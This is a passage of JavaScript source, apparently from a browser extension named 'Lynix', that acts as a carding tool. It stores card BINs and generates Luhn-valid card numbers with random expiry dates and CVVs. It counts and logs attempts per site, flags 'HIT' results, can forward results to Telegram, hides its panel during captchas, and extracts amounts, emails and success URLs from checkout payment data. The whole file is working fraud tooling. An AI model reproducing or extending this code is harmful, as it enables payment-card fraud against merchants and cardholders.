      notification.id = 'lynix-bin-notification';
      notification.className = 'bin-notification';

      const siteText = count === 1 ? 'Site' : 'Sites';

      notification.innerHTML = `
        <div class="bin-notification-header">
          <span class="bin-notification-icon">${LX.book}</span>
          <span class="bin-notification-title">Library Updated</span>
        </div>
        <div class="bin-notification-body">
          <span class="bin-notification-count">${count}</span> New ${siteText} Added
        </div>
      `;

      notification.style.setProperty('background', 'rgba(255,255,255,0.78)', 'important');
      notification.style.setProperty('background-color', 'rgba(255,255,255,0.78)', 'important');
      notification.style.setProperty('background-image', 'none', 'important');
      notification.style.setProperty('backdrop-filter', 'blur(8px)', 'important');
      notification.style.setProperty('-webkit-backdrop-filter', 'blur(8px)', 'important');
      notification.style.setProperty('border', '1px solid rgba(255,255,255,0.45)', 'important');
      notification.style.setProperty('box-shadow', '0 8px 32px rgba(13,148,136,0.12), inset 0 1px 0 rgba(255,255,255,0.6)', 'important');

      const header = notification.querySelector('.bin-notification-header');
      if (header) {
        header.style.setProperty('background', 'linear-gradient(135deg, rgba(13,148,136,0.85), rgba(15,118,110,0.9))', 'important');
        header.style.setProperty('border-bottom', '1px solid rgba(255,255,255,0.15)', 'important');
      }

      const body = notification.querySelector('.bin-notification-body');
      if (body) {
        body.style.setProperty('background', 'rgba(248,253,252,0.5)', 'important');
        body.style.setProperty('background-color', 'rgba(248,253,252,0.5)', 'important');
      }

      document.body.appendChild(notification);

      setTimeout(() => notification.classList.add('show'), 50);

      setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
          notification.remove();
          resolve();
        }, 300);
      }, 5000);
    });
  }



  function initGlobalStorage() {
    return new Promise((resolve) => {
      if (!window.LynixStorage || !window.LynixStorage.loadAllData) {
        globalStorageLoaded = true;
        resolve();
        return;
      }

      window.LynixStorage.loadAllData(function (data) {
        data = data || {};

        // Sync BINs
        if (data[K.SAVED_BINS]) {
          let bins = data[K.SAVED_BINS];
          if (typeof bins === 'string') try { bins = JSON.parse(bins); } catch (e) { bins = []; }
          if (Array.isArray(bins) && bins.length > 0) {
            savedBINs = [...new Set(bins)];
            localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
          }
        }

        // Sync background color
        if (data[K.BG_COLOR]) {
          pageBackgroundColor = data[K.BG_COLOR];
          localStorage.setItem(K.PAGE_BG_COLOR, data[K.BG_COLOR]);
        }
        if (data[K.PAGE_HAS_CUSTOM] !== undefined) {
          userHasSetCustomColor = data[K.PAGE_HAS_CUSTOM] === true || data[K.PAGE_HAS_CUSTOM] === 'true';
        }

        // Sync logs
        if (data[K.LOGS]) {
          let logs = data[K.LOGS];
          if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch (e) { logs = []; }
          if (Array.isArray(logs)) localStorage.setItem(K.LOGS, JSON.stringify(logs));
        }
        if (data[K.LOGS_CLEARED_AT]) {
          localStorage.setItem(K.LOGS_CLEARED_AT, data[K.LOGS_CLEARED_AT]);
        }

        // Sync custom name/email/address
        if (data[K.CUSTOM_NAME]) {
          customName = data[K.CUSTOM_NAME];
          localStorage.setItem(K.CUSTOM_NAME, data[K.CUSTOM_NAME]);
        }
        if (data[K.CUSTOM_EMAIL]) {
          customEmail = data[K.CUSTOM_EMAIL];
          localStorage.setItem(K.CUSTOM_EMAIL, data[K.CUSTOM_EMAIL]);
        }
        if (data[K.ADDR_STREET]) customAddrStreet = data[K.ADDR_STREET];
        if (data[K.ADDR_CITY]) customAddrCity = data[K.ADDR_CITY];
        if (data[K.ADDR_ZIP]) customAddrZip = data[K.ADDR_ZIP];
        if (data[K.ADDR_COUNTRY]) customAddrCountry = data[K.ADDR_COUNTRY];

        // Sync user session to localStorage (cross-origin availability)
        if (data[K.TOKEN]) {
          localStorage.setItem(K.TOKEN, data[K.TOKEN]);
        }
        if (data[K.USER_ID]) {
          userId = data[K.USER_ID];
          localStorage.setItem(K.USER_ID, data[K.USER_ID]);
        }
        if (data[K.FIRST_NAME]) {
          userFirstName = data[K.FIRST_NAME];
          localStorage.setItem(K.FIRST_NAME, data[K.FIRST_NAME]);
        }

        // Sync saved ID
        if (data[K.SAVED_ID]) {
          savedId = data[K.SAVED_ID];
          localStorage.setItem(K.SAVED_ID, data[K.SAVED_ID]);
        }

        // Sync HAS_CUSTOM_COLOR
        if (data[K.HAS_CUSTOM_COLOR] !== undefined) {
          localStorage.setItem(K.HAS_CUSTOM_COLOR, data[K.HAS_CUSTOM_COLOR]);
        }

        // Sync BG_ENABLED
        if (data[K.BG_ENABLED] !== undefined) {
          localStorage.setItem(K.BG_ENABLED, data[K.BG_ENABLED]);
        }

        // Sync PAGE_BG_COLOR
        if (data[K.PAGE_BG_COLOR]) {
          localStorage.setItem(K.PAGE_BG_COLOR, data[K.PAGE_BG_COLOR]);
        }

        // Sync toggles
        if (data[K.TOGGLE_TG_FORWARD] !== undefined) {
          tgForwardEnabled = data[K.TOGGLE_TG_FORWARD] !== false && data[K.TOGGLE_TG_FORWARD] !== 'false';
          localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled);
        }
        if (data[K.TOGGLE_HIT_SOUND] !== undefined) {
          localStorage.setItem(K.TOGGLE_HIT_SOUND, data[K.TOGGLE_HIT_SOUND]);
        }
        if (data[K.TOGGLE_AUTO_SS] !== undefined) {
          localStorage.setItem(K.TOGGLE_AUTO_SS, data[K.TOGGLE_AUTO_SS]);
        }

        // Sync music (name only -- MUSIC_DATA stays in chrome.storage, too large for localStorage)
        if (data[K.MUSIC_NAME]) {
          localStorage.setItem(K.MUSIC_NAME, data[K.MUSIC_NAME]);
        }

        // Sync card history
        if (data[K.CARD_HISTORY]) {
          let hist = data[K.CARD_HISTORY];
          if (typeof hist === 'string') try { hist = JSON.parse(hist); } catch (e) { hist = []; }
          if (Array.isArray(hist)) localStorage.setItem(K.CARD_HISTORY, JSON.stringify(hist));
        }

        // Sync last seen BIN time
        if (data[K.LAST_SEEN_BIN_TIME]) {
          localStorage.setItem(K.LAST_SEEN_BIN_TIME, data[K.LAST_SEEN_BIN_TIME]);
        }

        globalStorageLoaded = true;
        resolve();
      });

      // Timeout fallback
      setTimeout(() => {
        if (!globalStorageLoaded) {
          globalStorageLoaded = true;
          resolve();
        }
      }, 3000);
    });
  }

  function saveToGlobalStorage(key, value) {
    const data = {};
    data[key] = value;
    // Use the proper storageRequest path via storage module
    window.postMessage({ type: 'LYNIX_STORAGE_REQUEST', requestId: 'save_' + Date.now(), action: 'SET', data: data }, '*');
    localStorage.setItem(key, typeof value === 'object' ? JSON.stringify(value) : value);
  }

  initGlobalStorage();

  function loadCustomNameEmail() {
    return new Promise((resolve) => {
      if (window.LynixStorage && window.LynixStorage.loadAllData) {
        window.LynixStorage.loadAllData(function (data) {
          data = data || {};
          customName = data[K.CUSTOM_NAME] || localStorage.getItem(K.CUSTOM_NAME) || "";
          customEmail = data[K.CUSTOM_EMAIL] || localStorage.getItem(K.CUSTOM_EMAIL) || "";
          customAddrStreet = data[K.ADDR_STREET] || "";
          customAddrCity = data[K.ADDR_CITY] || "";
          customAddrZip = data[K.ADDR_ZIP] || "";
          customAddrCountry = data[K.ADDR_COUNTRY] || "";
          resolve({ name: customName, email: customEmail });
        });
        setTimeout(() => resolve({ name: customName, email: customEmail }), 2000);
      } else {
        customName = localStorage.getItem(K.CUSTOM_NAME) || "";
        customEmail = localStorage.getItem(K.CUSTOM_EMAIL) || "";
        resolve({ name: customName, email: customEmail });
      }
    });
  }

  function saveCustomName(name) {
    customName = name;
    localStorage.setItem(K.CUSTOM_NAME, name);
    if (window.LynixStorage && window.LynixStorage.saveCustomName) {
      window.LynixStorage.saveCustomName(name);
    }
  }

  function saveCustomEmail(email) {
    customEmail = email;
    localStorage.setItem(K.CUSTOM_EMAIL, email);
    if (window.LynixStorage && window.LynixStorage.saveCustomEmail) {
      window.LynixStorage.saveCustomEmail(email);
    }
  }

  loadCustomNameEmail().then(({ name, email }) => {
    const nameInput = document.getElementById('customNameInput');
    const emailInput = document.getElementById('customEmailInput');
    if (nameInput) nameInput.value = name;
    if (emailInput) emailInput.value = email;
  });

  let isMusicPlaying = false
  const autoSSEnabled = true
  const autoSubmitInterval = null
  let savedBINs = []
  let currentBinIndex = 0
  let savedId = ""
  let binBlurTimeout, idBlurTimeout
  let successStartTime = null
  let cardAttemptStartTime = null
  const extractedPaymentData = {
    cardNumber: "",
    bin: "",
    amount: "0",
    currency: "",
    email: "",
    businessUrl: "",
    successUrl: "",
  }
  let paymentDataFound = false
  window.addEventListener('storage', function (e) {
    if (e.key === K.LOGS) {
      const logs = JSON.parse(e.newValue || '[]')
      const logsClearedAt = localStorage.getItem(K.LOGS_CLEARED_AT)
      cardHistory = logsClearedAt ? logs.filter(log => log.time && log.time > logsClearedAt) : logs
      if (typeof updateHistoryDisplay === 'function') {
        updateHistoryDisplay()
      }
    }
    if (e.key === K.LOGS_CLEARED_AT && e.newValue) {
      cardHistory = []
      if (typeof updateHistoryDisplay === 'function') {
        updateHistoryDisplay()
      }
    }
    if (e.key === K.PAGE_BG_COLOR) {
      pageBackgroundColor = e.newValue || DEFAULT_BG_COLOR
      applyCustomStyles()
      const input = document.getElementById('pageBgColorInput')
      if (input) input.value = pageBackgroundColor
    }
  })

  function getSavedBIN() {
    if (savedBINs.length === 0) {
      const stored = localStorage.getItem(K.SAVED_BINS)
      if (stored) {
        try {
          savedBINs = JSON.parse(stored)
        } catch (e) {
          const oldBin = localStorage.getItem(K.SAVED_BINS)
          if (oldBin) savedBINs = [oldBin]
        }
      }
    }
    return savedBINs[currentBinIndex] || savedBINs[0] || ""
  }
  function saveBINs(bins) {
    savedBINs = [...new Set(bins.filter((b) => b && b.length >= 6))]
    localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs))
    // Sync full array to chrome.storage via storage module
    if (window.LynixStorage && window.LynixStorage.saveBINs) {
      window.LynixStorage.saveBINs(savedBINs);
    }
    if (typeof updateCtrlBinLabel === 'function') updateCtrlBinLabel()
  }
  function switchBin() {
    if (savedBINs.length <= 1) return
    currentBinIndex = (currentBinIndex + 1) % savedBINs.length
    const newBin = savedBINs[currentBinIndex]
    showWarning(`Bin Switch To: ${newBin}`, "info")
    updateBinStatus()
    if (typeof updateCtrlBinLabel === 'function') updateCtrlBinLabel()
    updateSelectedBinHighlight(true)
  }
  function getSavedId() {
    return savedId || localStorage.getItem(K.USER_ID) || ""
  }
  function saveID(id) {
    savedId = id
    localStorage.setItem(K.USER_ID, id)
    if (window.LynixStorage && window.LynixStorage.saveId) {
      window.LynixStorage.saveId(id);
    }
    window.postMessage({ type: "SAVE_ID", id: id }, "*")
  }
  function saveToggleState(toggleType, value) {
    localStorage.setItem("lynix_toggle_" + toggleType, value)
    if (window.LynixStorage && window.LynixStorage.saveToggleState) {
      window.LynixStorage.saveToggleState(toggleType, value);
    }
    window.postMessage(
      {
        type: "SAVE_TOGGLE_STATE",
        toggleType: toggleType,
        value: value,
      },
      "*",
    )
  }
  function generateLuhn(number) {
    function calculateSum(num) {
      let sum = 0
      let isEven = false
      for (let i = num.length - 1; i >= 0; i--) {
        let digit = Number.parseInt(num[i])
        if (isEven) {
          digit *= 2
          if (digit > 9) digit -= 9
        }
        sum += digit
        isEven = !isEven
      }
      return sum
    }
    for (let i = 0; i < 10; i++) {
      const testNumber = number + i
      if (calculateSum(testNumber) % 10 === 0) {
        return i
      }
    }
    return 0
  }
  function isAmex(bin) {
    const prefix = bin.replace(/[^0-9]/g, "").substring(0, 2)
    return prefix === "34" || prefix === "37"
  }
  function generateCard(bin) {
    if (!bin) return null
    let binPattern = bin
    let monthPattern = null
    let yearPattern = null
    let cvvPattern = null
    if (bin.includes("|")) {
      const parts = bin.split("|")
      binPattern = parts[0]
      monthPattern = parts[1] || null
      yearPattern = parts[2] || null
      cvvPattern = parts[3] || null
    }
    binPattern = binPattern.replace(/[^0-9xX]/g, "")
    let cardNumber = ""
    for (const c of binPattern) {
      cardNumber += c === "x" || c === "X" ? Math.floor(Math.random() * 10) : c
    }
    const targetLength = isAmex(binPattern) ? 15 : 16
    const remainingLength = targetLength - cardNumber.length - 1
    for (let i = 0; i < remainingLength; i++) {
      cardNumber += Math.floor(Math.random() * 10)
    }
    const checkDigit = generateLuhn(cardNumber)
    const fullCard = cardNumber + checkDigit
    const month = generateMonth(monthPattern)
    const year = generateYear(yearPattern)
    const cvv = generateCvv(cvvPattern, fullCard)
    return { card: fullCard, month, year, cvv }
  }
  function generateMonth(pattern) {
    if (!pattern) return randomMonth()
    pattern = pattern.trim()
    if (pattern === "xx" || pattern === "XX") return randomMonth()
    const monthNum = parseInt(pattern)
    if (monthNum >= 1 && monthNum <= 12) {
      return String(monthNum).padStart(2, "0")
    }
    return randomMonth()
  }
  function generateYear(pattern) {
    if (!pattern) return randomYear()
    pattern = pattern.trim()
    if (pattern === "xx" || pattern === "XX") return randomYear()
    const yearNum = parseInt(pattern)
    if (yearNum >= 0 && yearNum <= 99) {
      return String(yearNum).padStart(2, "0")
    }
    if (yearNum >= 2000 && yearNum <= 2099) {
      return String(yearNum).slice(-2)
    }
    return randomYear()
  }
  function generateCvv(pattern, card) {
    if (!pattern) return randomCvv(card)
    pattern = pattern.trim().toUpperCase()
    const isAmexCard = isAmex(card || "")
    const cvvLength = isAmexCard ? 4 : 3

    if (pattern === "RND" || pattern === "RANDOM" || pattern === "XXXX" || pattern === "XXX" || pattern === "XX") {
      return randomCvv(card)
    }
    let cvv = ""
    for (const c of pattern) {
      cvv += c === "X" ? Math.floor(Math.random() * 10) : c
    }
    if (cvv.length < cvvLength) {
      cvv = cvv.padStart(cvvLength, "0")
    }
    return cvv.substring(0, cvvLength)
  }
  function randomMonth() {
    const now = new Date()
    const currentMonth = now.getMonth() + 1
    const currentYear = now.getFullYear()
    const futureYear = currentYear + Math.floor(Math.random() * 6) + 1
    const m =
      futureYear === currentYear
        ? Math.floor(Math.random() * (12 - currentMonth + 1)) + currentMonth
        : Math.floor(Math.random() * 12) + 1
    return String(m).padStart(2, "0")
  }
  function randomYear() {
    const currentYear = new Date().getFullYear()
    return String(currentYear + Math.floor(Math.random() * 6) + 1).slice(-2)
  }
  function randomCvv(card) {
    return isAmex(card || "")
      ? String(Math.floor(Math.random() * 10000)).padStart(4, "0")
      : String(Math.floor(Math.random() * 1000)).padStart(3, "0")
  }
  function updateBinStatus() {
    const binStatus = document.getElementById("binStatus")
    const bin = getSavedBIN()
    if (binStatus) {
      if (bin) {
        const binInfo =
          savedBINs.length > 1
            ? `BIN ${currentBinIndex + 1}/${savedBINs.length}: ${bin.substring(0, 6)}...`
            : `BIN: ${bin.substring(0, 6)}...`
        binStatus.textContent = binInfo
        binStatus.classList.remove("hidden")
        binStatus.classList.add("success")
      } else {
        binStatus.textContent = ""
        binStatus.classList.add("hidden")
        binStatus.classList.remove("success")
      }
    }
  }
  function loadSavedBins() {
    const stored = localStorage.getItem(K.SAVED_BINS);
    if (stored) {
      try {
        const parsed = JSON.parse(stored);
        if (Array.isArray(parsed) && parsed.length > 0) {
          savedBINs = [...new Set(parsed)];
        }
      } catch (e) {
        const oldBin = localStorage.getItem(K.SAVED_BINS);
        if (oldBin) savedBINs = [oldBin];
      }
    }
    populateBinInputs();

    // Load BINs from chrome.storage (via storage module) and merge
    if (window.LynixStorage && window.LynixStorage.loadSavedBINs) {
      window.LynixStorage.loadSavedBINs(function (chromeBins) {
        if (Array.isArray(chromeBins) && chromeBins.length > 0) {
          // Merge: chrome.storage wins if it has more data
          if (chromeBins.length >= savedBINs.length) {
            savedBINs = [...new Set(chromeBins)];
          }
          localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
          populateBinInputs();
          updateSwitchBtnVisibility();
        }
      });
    }
  }

  function populateBinInputs() {
    const container = document.getElementById("binInputsContainer");
    if (container && savedBINs.length > 0) {
      const existingExtraRows = container.querySelectorAll(".bin-input-row:not(:first-child)");
      existingExtraRows.forEach((row) => row.remove());
      const firstInput = document.getElementById("binInput1");
      if (firstInput) firstInput.value = savedBINs[0] || "";
      for (let i = 1; i < savedBINs.length; i++) {
        const newRow = document.createElement("div");
        newRow.className = "bin-input-row";
        newRow.innerHTML = `
        <input type="text" class="input-field bin-input" placeholder="input bin" maxlength="30" value="${savedBINs[i]}">
        <button class="remove-bin-btn" title="Remove">−</button>
      `;
        container.appendChild(newRow);
        newRow.querySelector(".remove-bin-btn").addEventListener("click", () => {
          newRow.remove();
          // Persist remaining BINs
          const inputs = document.querySelectorAll(".bin-input");
          const remaining = Array.from(inputs).map(i => i.value.trim()).filter(b => b && b.length >= 6);
          if (remaining.length > 0) {
            saveBINs(remaining);
            currentBinIndex = Math.min(currentBinIndex, savedBINs.length - 1);
            updateBinStatus();
          }
          updateSwitchBtnVisibility();
        });
      }

      updateSelectedBinHighlight(false);
    }
    updateSwitchBtnVisibility();
  }

  function updateSelectedBinHighlight(animate = false) {
    const allRows = document.querySelectorAll(".bin-input-row");
    allRows.forEach((row, index) => {
      row.classList.remove("bin-selected");
      const input = row.querySelector(".bin-input");
      if (input) {
        input.classList.remove("bin-input-selected");
      }
    });

    if (allRows.length > 0 && currentBinIndex < allRows.length) {
      const selectedRow = allRows[currentBinIndex];
      if (selectedRow) {

        if (animate) {
          selectedRow.style.animation = 'none';
          selectedRow.offsetHeight;
          selectedRow.style.animation = '';
        }
        selectedRow.classList.add("bin-selected");
        const input = selectedRow.querySelector(".bin-input");
        if (input) {
          input.classList.add("bin-input-selected");
        }
      }
    }
  }

  function updateSwitchBtnVisibility() {
    const switchBtn = document.getElementById("switchBinBtn")
    const inputs = document.querySelectorAll(".bin-input")
    const filledInputs = Array.from(inputs).filter((i) => i.value.trim().length >= 6)
    if (switchBtn) {
      if (filledInputs.length > 1 || savedBINs.length > 1) {
        switchBtn.classList.remove("hidden")
      } else {
        switchBtn.classList.add("hidden")
      }
    }
  }
  function updateIdStatus() {
    const idStatus = document.getElementById("idStatus")
    const id = getSavedId()
    if (idStatus) {
      if (id) {
        idStatus.textContent = "ID: " + id.substring(0, 4) + "..."
        idStatus.classList.remove("hidden")
        idStatus.classList.add("success")
      } else {
        idStatus.textContent = ""
        idStatus.classList.add("hidden")
        idStatus.classList.remove("success")
      }
    }
  }
  function toggleMinimize(e) {
    const cardInner = document.getElementById("lxCardInner")
    const pill = document.getElementById("lxPill")
    if (cardInner && pill) {
      isMinimized = !isMinimized
      if (isMinimized) {
        cardInner.classList.add("hidden")
        pill.classList.remove("hidden")
      } else {
        cardInner.classList.remove("hidden")
        pill.classList.add("hidden")
      }
      wasAutoHiddenByCaptcha = false;
      dashboardStateBeforeCaptcha = null;
    }
    if (e) e.stopPropagation()
  }

  function autoHideDashboardForCaptcha() {
    if (!isDashboardActive || isMinimized) return;
    dashboardStateBeforeCaptcha = { wasMinimized: isMinimized, timestamp: Date.now() };
    wasAutoHiddenByCaptcha = true;
    isMinimized = true;
    const cardInner = document.getElementById("lxCardInner")
    const pill = document.getElementById("lxPill")
    if (cardInner) cardInner.classList.add("hidden")
    if (pill) pill.classList.remove("hidden")
  }

  function restoreDashboardAfterCaptcha() {
    if (!isDashboardActive || !wasAutoHiddenByCaptcha || !dashboardStateBeforeCaptcha) return;
    const timePassed = Date.now() - dashboardStateBeforeCaptcha.timestamp;
    if (timePassed < 5 * 60 * 1000 && !dashboardStateBeforeCaptcha.wasMinimized) {
      isMinimized = false;
      const cardInner = document.getElementById("lxCardInner")
      const pill = document.getElementById("lxPill")
      if (cardInner) cardInner.classList.remove("hidden")
      if (pill) pill.classList.add("hidden")
    }
    wasAutoHiddenByCaptcha = false;
    dashboardStateBeforeCaptcha = null;
  }

  let wasAutoMinimizedForModal = false;

  function autoMinimizeForModal() {
    if (!isDashboardActive || isMinimized) return;
    wasAutoMinimizedForModal = true;
    isMinimized = true;
    const cardInner = document.getElementById("lxCardInner")
    const pill = document.getElementById("lxPill")
    if (cardInner) cardInner.classList.add("hidden")
    if (pill) pill.classList.remove("hidden")
  }

  function autoRestoreAfterModal() {
    if (!isDashboardActive || !wasAutoMinimizedForModal || !isMinimized) return;
    isMinimized = false;
    const cardInner = document.getElementById("lxCardInner")
    const pill = document.getElementById("lxPill")
    if (cardInner) cardInner.classList.remove("hidden")
    if (pill) pill.classList.add("hidden")
    wasAutoMinimizedForModal = false;
  }

  let lastToastMessage = ""
  let lastToastTime = 0
  const TOAST_DEBOUNCE_MS = 1500
  const LX_MAX_NOTIFS = 5

  function showLxNotif(title, subtitle, type = "muted") {
    const stack = document.getElementById("lxNotifStack")
    if (!stack) return
    // Limit visible notifications
    while (stack.children.length >= LX_MAX_NOTIFS) {
      const oldest = stack.firstElementChild
      if (oldest) oldest.remove()
    }
    const badgeLabels = { hit: "HIT", error: "FAIL", warn: "WARN", success: "OK", muted: "INFO" }
    const dotClass = type === "success" ? "hit" : type
    const notif = document.createElement("div")
    notif.className = "lx-notif"
    notif.innerHTML = `
      <div class="lx-notif-dot ${dotClass}"></div>
      <div class="lx-notif-body">
        <div class="lx-notif-title">${title}</div>
        ${subtitle ? `<div class="lx-notif-sub">${subtitle}</div>` : ""}
      </div>
      <span class="lx-notif-badge ${dotClass}">${badgeLabels[type] || "INFO"}</span>
    `
    stack.appendChild(notif)
    requestAnimationFrame(() => {
      requestAnimationFrame(() => notif.classList.add("show"))
    })
    setTimeout(() => {
      if (notif.parentNode) {
        notif.classList.remove("show")
        notif.classList.add("hide")
        setTimeout(() => notif.remove(), 350)
      }
    }, 4000)
  }

  function persistLog(title, type, fullCard, amount) {
    try {
      const log = { message: title, type: type, time: Date.now() };
      if (fullCard) log.fullCard = fullCard;
      if (amount) log.amount = amount;
      window.postMessage({
        type: 'PERSIST_LOG',
        log: log
      }, '*');
    } catch (e) { }
  }

  function showWarning(message, type = "info") {
    const now = Date.now()
    if (message === lastToastMessage && now - lastToastTime < TOAST_DEBOUNCE_MS) {
      return
    }
    lastToastMessage = message
    lastToastTime = now
    if (type === "info") {
      if (message.includes("✅") || message.includes("success") || message.includes("Success") || message.includes("saved") || message.includes("Saved")) {
        type = "success"
      } else if (message.includes("❌") || message.includes("error") || message.includes("Error") || message.includes("Decline") || message.includes("decline") || message.includes("failed")) {
        type = "error"
      }
    }
    const cleanMessage = message.replace(/^[✅❌⚠️ℹ️🎉⛔🗑️]\s*/, "").trim()
    const notifType = type === "success" ? "success" : type === "error" ? "error" : "muted"
    showLxNotif(cleanMessage, null, notifType)
    persistLog(cleanMessage, notifType, window.generatedCardFull || null)
  }

  function showCardToast(card, mm, yy, cvv) {
    const fullCard = `${card}|${mm}|${yy}|${cvv}`
    attemptCount++
    // Update status card counters
    const attEl = document.getElementById("lxSiteAttempts")
    if (attEl) attEl.textContent = attemptCount

    const savedToken = localStorage.getItem(K.TOKEN)
    if (savedToken) {
      sendToBackground({
        type: "API_REQUEST",
        endpoint: "attempt",
        payload: { token: savedToken }
      }).then(response => {
        if (response && response.attempts) {
          userAttemptsCount = response.attempts;
        }
      }).catch(() => { })
    }

    // Show right-side notification for the card attempt (unmasked)
    showLxNotif(`#${attemptCount} ${fullCard}`, null, "muted")
    persistLog(`#${attemptCount}`, "muted", fullCard)

    // Record attempt with site for per-site stats
    sendToBackground({ type: "RECORD_ATTEMPT", site: window.location.hostname });
  }
  function createCelebration() {
    createSnowfall()
    createSparkles()
  }
  function createSnowfall() {
    const container = document.createElement("div")
    container.className = "snowfall-container"
    document.body.appendChild(container)
    for (let i = 0; i < 60; i++) {
      const snowflake = document.createElement("div")
      const posClass = "pos-" + Math.floor(Math.random() * 20) * 5
      const sizeClass = "size-" + ["sm", "md", "lg"][Math.floor(Math.random() * 3)]
      const delayClass = "delay-" + Math.floor(Math.random() * 5)
      const durationClass = "dur-" + Math.floor(Math.random() * 3)
      const colorClass = ["white", "gold", "green"][Math.floor(Math.random() * 3)]
      snowflake.className = `snowflake ${posClass} ${sizeClass} ${delayClass} ${durationClass} ${colorClass}`
      container.appendChild(snowflake)
    }
    setTimeout(() => container.remove(), 12000)
  }
  function createSparkles() {
    const container = document.createElement("div")
    container.className = "celebration-container"
    document.body.appendChild(container)
    for (let i = 0; i < 30; i++) {
      const sparkle = document.createElement("div")
      const posXClass = "sparkle-x-" + Math.floor(Math.random() * 10) * 10
      const posYClass = "sparkle-y-" + Math.floor(Math.random() * 10) * 10
      const delayClass = "sparkle-delay-" + Math.floor(Math.random() * 10)
      sparkle.className = `sparkle-star ${posXClass} ${posYClass} ${delayClass}`
      container.appendChild(sparkle)
    }
    setTimeout(() => container.remove(), 8000)
  }
  const currencySymbols = {

    usd: "$",
    eur: "€",
    gbp: "£",
    jpy: "¥",
    cny: "¥",
    cnh: "¥",

    inr: "₹",
    krw: "₩",
    thb: "฿",
    php: "₱",
    myr: "RM",
    sgd: "S$",
    hkd: "HK$",
    twd: "NT$",
    idr: "Rp",
    vnd: "₫",
    pkr: "₨",
    bdt: "৳",
    lkr: "Rs",
    npr: "Rs",
    mmk: "K",
    khr: "៛",
    lak: "₭",

    chf: "CHF",
    sek: "kr",
    nok: "kr",
    dkk: "kr",
    pln: "zł",
    czk: "Kč",
    huf: "Ft",
    ron: "lei",
    bgn: "лв",
    hrk: "kn",
    rsd: "дин",
    uah: "₴",
    rub: "₽",
    byn: "Br",
    mdl: "L",
    all: "L",
    mkd: "ден",
    bam: "KM",
    isk: "kr",

    cad: "C$",
    mxn: "MX$",
    brl: "R$",
    ars: "AR$",
    clp: "CL$",
    cop: "CO$",
    pen: "S/",
    uyu: "$U",
    pyg: "₲",
    bob: "Bs",
    crc: "₡",
    gtq: "Q",
    hnl: "L",
    nio: "C$",
    pab: "B/.",
    dop: "RD$",
    jmd: "J$",
    ttd: "TT$",
    bbd: "Bds$",
    bsd: "B$",
    kyd: "CI$",
    xcd: "EC$",
    awg: "ƒ",
    ang: "ƒ",
    srd: "Sr$",
    gyd: "G$",
    bzd: "BZ$",
    htg: "G",

    aed: "د.إ",
    sar: "﷼",
    qar: "﷼",
    omr: "﷼",
    bhd: "BD",
    kwd: "KD",
    jod: "JD",
    lbp: "L£",
    egp: "E£",
    ils: "₪",
    try: "₺",
    irr: "﷼",
    iqd: "ع.د",
    syp: "£S",
    yer: "﷼",
    zar: "R",
    ngn: "₦",
    kes: "KSh",
    ugx: "USh",
    tzs: "TSh",
    ghs: "GH₵",
    xof: "CFA",
    xaf: "FCFA",
    mad: "DH",
    dzd: "DA",
    tnd: "DT",
    lyd: "LD",
    etb: "Br",
    rwf: "FRw",
    mur: "Rs",
    scr: "Rs",

    aud: "A$",
    nzd: "NZ$",
    fjd: "FJ$",
    pgk: "K",
    wst: "WS$",
    top: "T$",
    vuv: "VT",
    sbd: "SI$",

    btc: "₿",
    eth: "Ξ",
    xrp: "XRP",
    ltc: "Ł",
  }
  function getCurrencySymbol(code) {
    if (!code) return "$"
    return currencySymbols[code.toLowerCase()] || code.toUpperCase() + " "
  }
  function extractPaymentData(data) {
    if (paymentDataFound || !data || typeof data !== "object") return
    function findValue(obj, key) {
      if (!obj || typeof obj !== "object") return null
      if (key in obj) return obj[key]
      for (const prop in obj) {
        if (obj[prop] && typeof obj[prop] === "object") {
          const found = findValue(obj[prop], key)
          if (found !== null) return found
        }
      }
      return null
    }

    function cleanBusinessUrl(url) {
      if (!url) return null;
      try {
        let clean = url.toString().trim();

        clean = clean.replace(/^https?:\/\//, '');

        clean = clean.replace(/^www\./, '');

        clean = clean.split('/')[0];
        clean = clean.split('?')[0];
        clean = clean.split('#')[0];

        clean = clean.split(':')[0];

        return clean || null;
      } catch (e) {
        return url;
      }
    }

    let updated = false

    if (!extractedPaymentData.businessUrl) {
      try {
        let rawBusinessUrl = null;

        if (data.account_settings?.business_url) {
          rawBusinessUrl = data.account_settings.business_url;
        }

        else if (data.account_settings?.display_name) {
          rawBusinessUrl = data.account_settings.display_name;
        }

        else if (data.statement_descriptor) {
          rawBusinessUrl = data.statement_descriptor;
        }

        else {
          rawBusinessUrl = findValue(data, "business_url") || findValue(data, "display_name");
        }

        if (rawBusinessUrl) {
          extractedPaymentData.businessUrl = cleanBusinessUrl(rawBusinessUrl);
          updated = true;
        }
      } catch (e) { }
    }

    if (!extractedPaymentData.email) {
      const email = data.customer_email || findValue(data, "customer_email")
      if (email) {
        extractedPaymentData.email = email
        updated = true
      }
    }

    if (!extractedPaymentData.successUrl) {
      try {
        let successUrl = null;
        if (data.success_url) {
          successUrl = data.success_url;
        }
        else if (data.return_url) {
          successUrl = data.return_url;
        }
        else if (data.redirect_url) {
          successUrl = data.redirect_url;
        }
        else if (data.payment_intent?.return_url) {
          successUrl = data.payment_intent.return_url;
        }
        else if (data.confirmation_url) {
          successUrl = data.confirmation_url;
        }
        else if (data.next_action?.redirect_to_url?.url) {
          successUrl = data.next_action.redirect_to_url.url;
        }
        else {
          successUrl = findValue(data, "success_url");
        }
        if (successUrl) {
          extractedPaymentData.successUrl = successUrl;
          updated = true;
        }
      } catch (e) { }
    }

    if (!extractedPaymentData.amount || extractedPaymentData.amount === "0.00" || extractedPaymentData.amount === "0") {
      try {
        let amount = null;
        let originalCurrency = null;

        if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
          const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
          if (usdMeta && usdMeta.total && usdMeta.total > 0) {
            amount = usdMeta.total;
            originalCurrency = 'usd';
          }
        }

        if (!amount && data.line_item_group?.presentment_exchange_rate_meta?.integration_currency) {
          const integrationCurrency = data.line_item_group.presentment_exchange_rate_meta.integration_currency;
          const exchangeRate = parseFloat(data.line_item_group.presentment_exchange_rate_meta.exchange_rate);
          if (data.line_item_group.total && exchangeRate > 0) {
            amount = Math.round(data.line_item_group.total / exchangeRate);
            originalCurrency = integrationCurrency;
          }
        }

